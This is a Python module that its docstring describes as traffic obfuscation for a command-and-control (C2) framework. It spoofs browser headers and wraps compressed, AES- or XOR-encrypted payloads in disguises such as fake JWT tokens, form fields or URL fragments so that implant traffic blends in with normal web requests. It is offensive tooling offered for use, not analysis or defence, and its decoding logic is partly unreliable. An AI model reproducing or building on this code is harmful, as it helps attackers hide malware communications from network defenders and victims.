"""
Traffic obfuscation techniques for the C2 framework
"""
import random
import json
import base64
import zlib
import string
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os

def generate_random_string(length=10):
    """Generate a random string of fixed length"""
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def add_junk_headers():
    """Generate random HTTP headers to blend in with normal traffic"""
    headers = {}
    
    # Common legitimate headers with random values
    if random.random() > 0.5:
        headers['Accept-Language'] = random.choice([
            'en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9',
            'de-DE,de;q=0.8,en-US;q=0.6', 'es-ES,es;q=0.9,en;q=0.7'
        ])
    
    if random.random() > 0.5:
        headers['User-Agent'] = random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0'
        ])
    
    if random.random() > 0.7:
        headers['Referer'] = random.choice([
            'https://www.google.com/',
            'https://www.bing.com/',
            'https://www.example.com/'
        ])
    
    if random.random() > 0.6:
        headers['Accept-Encoding'] = 'gzip, deflate, br'
    
    if random.random() > 0.8:
        headers['DNT'] = '1'
    
    # custom fake headers 
    num_custom = random.randint(0, 3)
    for _ in range(num_custom):
        header_name = random.choice([
            'X-Requested-With', 'X-Correlation-ID', 'X-Request-ID',
            'X-Device-Info', 'X-Forwarded-For', 'X-Analytics'
        ])
        headers[header_name] = generate_random_string(8)
    
    return headers


def obfuscate_data(data, key=None):
    """
    Obfuscate data with multiple layers of encoding
    1. Compress with zlib
    2. Encrypt with XOR or AES if key provided
    3. Base64 encode
    4. Add random padding
    """
    # Convert data to JSON if it's a dict or list
    if isinstance(data, (dict, list)):
        data = json.dumps(data)
    
    # Convert to bytes if it's a string
    if isinstance(data, str):
        data = data.encode('utf-8')
    
    # Compress
    compressed = zlib.compress(data)
    
    if key:
        if len(key) < 32:  # Ensure key is 32 bytes for AES-256
            key = key.ljust(32, b'X')[:32]
        
        iv = os.urandom(16)  
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        
        padding_len = 16 - (len(compressed) % 16)
        padded_data = compressed + (bytes([padding_len]) * padding_len)
        
        encrypted = iv + encryptor.update(padded_data) + encryptor.finalize()
    else:
        xor_key = random.randint(1, 255)
        encrypted = bytes([xor_key]) + bytes([b ^ xor_key for b in compressed])
    
    encoded = base64.urlsafe_b64encode(encrypted)
    
    # Add random padding - make the data look like various web formats
    format_type = random.randint(0, 3)
    
    if format_type == 0:
        # Make it look like a JWT token
        prefix = generate_random_string(random.randint(10, 20)).encode()
        suffix = generate_random_string(random.randint(10, 20)).encode()
        result = base64.urlsafe_b64encode(prefix) + b'.' + encoded + b'.' + base64.urlsafe_b64encode(suffix)
    elif format_type == 1:
        # Make it look like form data
        junk_fields = random.randint(1, 3)
        result = encoded
        for _ in range(junk_fields):
            field_name = generate_random_string(random.randint(5, 10))
            field_value = generate_random_string(random.randint(5, 20))
            result = result + b'&' + field_name.encode() + b'=' + field_value.encode()
    elif format_type == 2:
        # Make it look like a fragment identifier
        result = b'id=' + encoded + b'#' + generate_random_string(random.randint(5, 15)).encode()
    else:
        # Simple padding
        prefix = generate_random_string(random.randint(0, 10)).encode()
        suffix = generate_random_string(random.randint(0, 10)).encode()
        result = prefix + encoded + suffix
    
    return result.decode('utf-8', errors='ignore')

def deobfuscate_data(obfuscated_data, key=None):
    """
    Reverse the obfuscation process
    """
    data = obfuscated_data
    
    # Handle JWT-like format
    if '.' in data:
        parts = data.split('.')
        if len(parts) >= 3:
            data = parts[1]  # Middle part contains our data
    
    # Handle form data format
    if '&' in data:
        data = data.split('&')[0]
    
    # Handle fragment identifier format
    if '#' in data:
        data = data.split('#')[0]
        if data.startswith('id='):
            data = data[3:]
    
    # Try to find the base64 encoded part
    try:
        # Find and extract a valid base64 string
        for start in range(len(data)):
            for end in range(len(data), start, -1):
                try:
                    # Try decoding this substring
                    encoded_part = data[start:end]
                    decoded = base64.urlsafe_b64decode(encoded_part)
                    
                    # If we get here, we found something that base64 decodes
                    data = encoded_part
                    break
                except:
                    continue
            if data != obfuscated_data:
                break
    except:
        pass
    
    try:
        # Base64 decode
        decoded = base64.urlsafe_b64decode(data.encode())
        
        # Decrypt
        if key:
            if len(key) < 32:
                key = key.ljust(32, b'X')[:32]
            
            iv = decoded[:16]
            ciphertext = decoded[16:]
            
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            
            decrypted = decryptor.update(ciphertext) + decryptor.finalize()
            
            # Remove padding
            padding_len = decrypted[-1]
            if padding_len < 16:
                decrypted = decrypted[:-padding_len]
        else:
            # Simple XOR decryption
            xor_key = decoded[0]
            decrypted = bytes([b ^ xor_key for b in decoded[1:]])
        
        # Decompress
        decompressed = zlib.decompress(decrypted)
        
        # Try to parse as JSON
        try:
            return json.loads(decompressed)
        except:
            return decompressed.decode('utf-8')
            
    except Exception as e:
        return f"Error deobfuscating data: {str(e)}"